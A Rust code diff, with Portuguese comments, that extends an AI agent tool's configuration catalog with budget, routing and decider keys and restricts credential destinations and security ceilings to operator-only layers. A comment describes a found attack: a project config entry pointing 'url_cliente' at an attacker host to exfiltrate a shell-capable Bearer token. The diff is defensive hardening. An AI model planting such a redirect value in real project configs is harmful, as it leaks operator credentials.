@@ -81,6 +81,20 @@ pub struct Chave {
     pub natureza: Natureza,
     /// O motivo de `Natureza::Ambiente` em ingles (o portugues fica no proprio enum).
     pub motivo_en: Option<&'static str>,
+    /// De que camadas a chave pode vir (`SO_DO_OPERADOR`). Decidido aqui, por chave, e
+    /// aplicado UMA vez na `carga::carregar`: um `if` em cada leitor seria a regra que o
+    /// leitor novo esquece.
+    pub alcance: Alcance,
+}
+
+/// De onde uma chave pode vir.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum Alcance {
+    /// De qualquer camada da precedencia, inclusive do projeto confiado.
+    Qualquer,
+    /// So do operador: ambiente, perfil ou `<pasta>/config.json`. O `.phxclaw/config.json`
+    /// do projeto que a declara e IGNORADO com aviso. O motivo, em portugues e ingles.
+    Operador(Txt),
 }
 
 impl Chave {
@@ -100,13 +114,20 @@ impl Chave {
     pub fn no_arquivo(&self) -> bool {
         self.natureza == Natureza::Config
     }
+    /// O motivo (pt, en), se a chave so vale do operador.
+    pub fn so_do_operador(&self) -> Option<Txt> {
+        match self.alcance {
+            Alcance::Operador(m) => Some(m),
+            Alcance::Qualquer => None,
+        }
+    }
 }
 
 // --- a tabela fixa -------------------------------------------------------------------
 
 /// Texto de tela nos dois idiomas do catalogo: (portugues, ingles). Par na mesma linha
 /// para que chave nova nao nasca sem a traducao -- o teste reprova a que nascer.
-type Txt = (&'static str, &'static str);
+pub type Txt = (&'static str, &'static str);
 
 enum N {
     C,
@@ -214,6 +235,68 @@ const FIXAS: &[L] = &[
         (
             "Modelo de visão da leitura de tela",
             "Vision model for screen reading",
+        ),
+    ),
+    c(
+        "modelo.roteamento",
+        "PHXCLAW_MODELO_ROTEAMENTO",
+        P,
+        None,
+        (
+            "Arquivo JSON da política de roteamento e troca de provedor; vale só para o modelo rota ou rota:<spec>",
+            "JSON file with the provider routing and fallback policy; applies only to the model rota or rota:<spec>",
+        ),
+    ),
+    // --- decisor Laya (R1): desligado sem url; o destino e a credencial passam pelo
+    // http.json (liberar e credenciais), a mesma politica do no HTTP ---
+    c(
+        "decisao.laya.url",
+        "PHXCLAW_DECISAO_LAYA_URL",
+        T,
+        None,
+        (
+            "URL base do laya-serve (decisor System 1, POST /v1/systemone); vazio = Laya desligado. Loopback e rede privada só com liberar no http.json",
+            "Base URL of laya-serve (System 1 decider, POST /v1/systemone); empty = Laya off. Loopback and private networks only with liberar in http.json",
+        ),
+    ),
+    c(
+        "decisao.laya.modelo",
+        "PHXCLAW_DECISAO_LAYA_MODELO",
+        Tipo::Enum(&["english", "multilingual", "typed-decisions"]),
+        Some("multilingual"),
+        (
+            "Checkpoint do Laya pedido ao servidor (multilingual para português)",
+            "Laya checkpoint requested from the server (multilingual for Portuguese)",
+        ),
+    ),
+    c(
+        "decisao.laya.credencial_nome",
+        "PHXCLAW_DECISAO_LAYA_CREDENCIAL_NOME",
+        T,
+        None,
+        (
+            "Nome da credencial bearer declarada no http.json (o segredo fica no broker: phxclaw credencial guardar NOME); vazio = sem Authorization",
+            "Name of the bearer credential declared in http.json (the secret stays in the broker: phxclaw credencial guardar NAME); empty = no Authorization",
+        ),
+    ),
+    c(
+        "decisao.laya.limiar",
+        "PHXCLAW_DECISAO_LAYA_LIMIAR",
+        R,
+        Some("0.8"),
+        (
+            "Confiança mínima (answer_confidence, 0 a 1) para a decisão do Laya valer; abaixo, a escada sobe ao próximo degrau",
+            "Minimum confidence (answer_confidence, 0 to 1) for a Laya decision to stand; below it, the ladder climbs to the next rung",
+        ),
+    ),
+    c(
+        "decisao.laya.prazo_ms",
+        "PHXCLAW_DECISAO_LAYA_PRAZO_MS",
+        I,
+        Some("5000"),
+        (
+            "Prazo de cada pergunta ao laya-serve, em ms (1 a 60000); estourou, sem decisão e a escada sobe",
+            "Deadline of each question to laya-serve, in ms (1 to 60000); past it, no decision and the ladder climbs",
         ),
     ),
     c(
@@ -325,6 +408,77 @@ const FIXAS: &[L] = &[
             "Project root (default the current folder); .phxclaw/config.json lives in it",
         ),
         LOCALIZA,
+    ),
+    // --- custo e orcamento (R2/R3 do radar): o preco e do operador, nunca do codigo ---
+    c(
+        "custo.precos",
+        "PHXCLAW_CUSTO_PRECOS",
+        P,
+        None,
+        (
+            "Arquivo JSON da tabela de preços por modelo (moeda; entrada, saída e cache por milhão de tokens; data e fonte da cotação); vazio = custo não medido",
+            "JSON file with the price table per model (currency; input, output and cache per million tokens; quote date and source); empty = cost not measured",
+        ),
+    ),
+    c(
+        "orcamento.tarefa_tokens",
+        "PHXCLAW_ORCAMENTO_TAREFA_TOKENS",
+        I,
+        None,
+        (
+            "Orçamento padrão de tokens (entrada + saída) por tarefa; ao bater, a tarefa para em budget_exceeded",
+            "Default token budget (input + output) per task; when reached, the task stops as budget_exceeded",
+        ),
+    ),
+    c(
+        "orcamento.tarefa_custo",
+        "PHXCLAW_ORCAMENTO_TAREFA_CUSTO",
+        R,
+        None,
+        (
+            "Orçamento padrão em dinheiro por tarefa, na moeda da tabela de preços (exige custo.precos)",
+            "Default money budget per task, in the currency of the price table (requires custo.precos)",
+        ),
+    ),
+    c(
+        "orcamento.fluxo_tokens",
+        "PHXCLAW_ORCAMENTO_FLUXO_TOKENS",
+        I,
+        None,
+        (
+            "Orçamento padrão de tokens por execução de fluxo, somando todos os passos",
+            "Default token budget per workflow run, adding up every step",
+        ),
+    ),
+    c(
+        "orcamento.fluxo_custo",
+        "PHXCLAW_ORCAMENTO_FLUXO_CUSTO",
+        R,
+        None,
+        (
+            "Orçamento padrão em dinheiro por execução de fluxo, na moeda da tabela de preços",
+            "Default money budget per workflow run, in the currency of the price table",
+        ),
+    ),
+    c(
+        "orcamento.teto_tokens",
+        "PHXCLAW_ORCAMENTO_TETO_TOKENS",
+        I,
+        None,
+        (
+            "Teto por pedido, em tokens: nenhum pedido (tarefa ou fluxo) passa dele; acima, a criação é recusada. Não soma pedidos diferentes: não é teto de gasto do processo",
+            "Per-request token ceiling: no request (task or workflow) goes above it; above it, creation is refused. It does not sum different requests: it is not a process spending cap",
+        ),
+    ),
+    c(
+        "orcamento.teto_custo",
+        "PHXCLAW_ORCAMENTO_TETO_CUSTO",
+        R,
+        None,
+        (
+            "Teto por pedido, em dinheiro: nenhum pedido passa dele; acima, a criação é recusada. Não soma pedidos diferentes: não é teto de gasto do processo",
+            "Per-request money ceiling: no request goes above it; above it, creation is refused. It does not sum different requests: it is not a process spending cap",
+        ),
     ),
     // --- perfil (uma camada por cima da pasta, como o perfil do VS Code) ---
     a(
@@ -1106,6 +1260,16 @@ const FIXAS: &[L] = &[
         ),
     ),
     c(
+        "ui.bloquear_inspecao",
+        "PHXCLAW_UI_BLOQUEAR_INSPECAO",
+        B,
+        Some("true"),
+        (
+            "Bloqueia na tela o menu de contexto, F12 e os atalhos do inspetor. No navegador é dissuasão, não segurança (o menu do navegador e o view-source alcançam o mesmo); no desktop vale sempre",
+            "Blocks the context menu, F12 and the inspector shortcuts in the screen. In the browser it is deterrence, not security (the browser menu and view-source reach the same); on the desktop it always applies",
+        ),
+    ),
+    c(
         "clima.api",
         "PHXCLAW_MET_API",
         T,
@@ -1224,6 +1388,16 @@ const FIXAS: &[L] = &[
         (
             "Teto de tempo (ms) de uma completação por IA no editor",
             "Time cap (ms) of one AI completion in the editor",
+        ),
+    ),
+    c(
+        "ide.ia_teto_tokens_hora",
+        "PHXCLAW_IDE_IA_TETO_TOKENS_HORA",
+        I,
+        None,
+        (
+            "Teto de tokens que a completação por IA do editor gasta por hora, somadas todas (ela não roda sob tarefa e nenhum orcamento.* a alcança); acima, recusa (429); vazio: sem teto",
+            "Token cap the editor's AI completion spends per hour, all summed (it runs under no task and no orcamento.* reaches it); above it, refused (429); empty: no cap",
         ),
     ),
     c(
@@ -2127,6 +2301,7 @@ fn do_canal(def: &CanalDef, out: &mut Vec<Chave>) {
         descricao_en: en,
         natureza: Natureza::Config,
         motivo_en: None,
+        alcance: Alcance::Qualquer,
     };
     let par = |(pt, en): Txt| (pt.to_string(), en.to_string());
     out.push(cfg(
@@ -2207,9 +2382,87 @@ fn do_canal(def: &CanalDef, out: &mut Vec<Chave>) {
                     }),
                 },
                 motivo_en: None,
+                alcance: Alcance::Qualquer,
             }),
         }
     }
+}
+
+// --- o alcance: o que o projeto NAO decide -----------------------------------------------
+
+const DESTINO: Txt = (
+    "destino que recebe credencial do operador: um repositório não escolhe para onde o segredo vai",
+    "destination that receives an operator credential: a repository does not choose where the secret goes",
+);
+const TETO: Txt = (
+    "teto, permissão ou lista de confiança de segurança: o projeto não afrouxa o que o operador fixou",
+    "security ceiling, permission or trust list: the project does not loosen what the operator set",
+);
+const CONTA: Txt = (
+    "servidor, conta ou canal do próprio operador: não é configuração de projeto",
+    "the operator's own server, account or channel: not project configuration",
+);
+
+/// As chaves que so valem do OPERADOR (ambiente, perfil, pasta), nunca do projeto. Chave
+/// inteira, ou prefixo de secao terminado em `.`; a primeira que casa decide o motivo.
+///
+/// Por que existe: projeto confiado e confianca para INSTRUIR (AGENTS.md, modelo, estilo,
+/// executaveis do projeto), nao para redirecionar credencial nem afrouxar teto. Medido em
+/// 09/10/2026 (achado A3): `{"api":{"url_cliente":"http://atacante"}}` no
+/// `.phxclaw/config.json` de um repositorio confiado fazia o `phxclaw api` mandar o Bearer
+/// -- que alcanca `/v1/tunel/terminal`, um shell -- em claro para fora. O criterio de
+/// entrada: URL ou nome que recebe credencial (DESTINO), teto/permissao/lista de confianca
+/// (TETO) e servidor/conta/canal do operador (CONTA). Executavel continua do projeto
+/// confiado: e o que a confianca sempre cobriu.
+pub const SO_DO_OPERADOR: &[(&str, Txt)] = &[
+    ("api.url_cliente", DESTINO),
+    ("decisao.laya.url", DESTINO),
+    ("decisao.laya.credencial_nome", DESTINO),
+    ("elevenlabs.api", DESTINO),
+    ("imagem.url", DESTINO),
+    ("xai.api", DESTINO),
+    ("n8n.url", DESTINO),
+    ("ide.api_url", DESTINO),
+    ("mcp.config", DESTINO),
+    ("forja.", DESTINO),
+    ("postgres.", DESTINO),
+    ("email.permitidos", TETO),
+    ("email.", DESTINO),
+    ("orcamento.teto_tokens", TETO),
+    ("orcamento.teto_custo", TETO),
+    // A completacao do editor gasta fora de qualquer orcamento: o teto dela e do operador.
+    ("ide.ia_teto_tokens_hora", TETO),
+    // A tabela de precos e o que o teto em dinheiro mede: precos zerados pelo projeto
+    // anulariam o teto sem tocar nele.
+    ("custo.precos", TETO),
+    ("agente.capacidades", TETO),
+    ("rede.destinos", TETO),
+    ("git.segredos.exigir", TETO),
+    ("ui.bloquear_inspecao", TETO),
+    ("pontes.rustclaw.prompt_no_argv", TETO),
+    ("fluxos.max_simultaneos", TETO),
+    ("imagem.entrada_pixels_max", TETO),
+    ("desktop.", TETO),
+    ("plugins.", TETO),
+    ("pacotes.", TETO),
+    ("api.", CONTA),
+    ("ponte.", CONTA),
+    ("dispositivos.", CONTA),
+    ("canais.", CONTA),
+];
+
+fn alcance_de(chave: &str) -> Alcance {
+    SO_DO_OPERADOR
+        .iter()
+        .find(|(p, _)| {
+            if p.ends_with('.') {
+                chave.starts_with(p)
+            } else {
+                chave == *p
+            }
+        })
+        .map(|(_, m)| Alcance::Operador(*m))
+        .unwrap_or(Alcance::Qualquer)
 }
 
 fn montar() -> Vec<Chave> {
@@ -2238,10 +2491,14 @@ fn montar() -> Vec<Chave> {
                 },
                 N::A((motivo, _)) => Natureza::Ambiente { motivo },
             },
+            alcance: Alcance::Qualquer,
         })
         .collect();
     for def in CANAIS {
         do_canal(def, &mut v);
+    }
+    for c in &mut v {
+        c.alcance = alcance_de(&c.chave);
     }
     v.sort_by(|a, b| a.chave.cmp(&b.chave));
     v
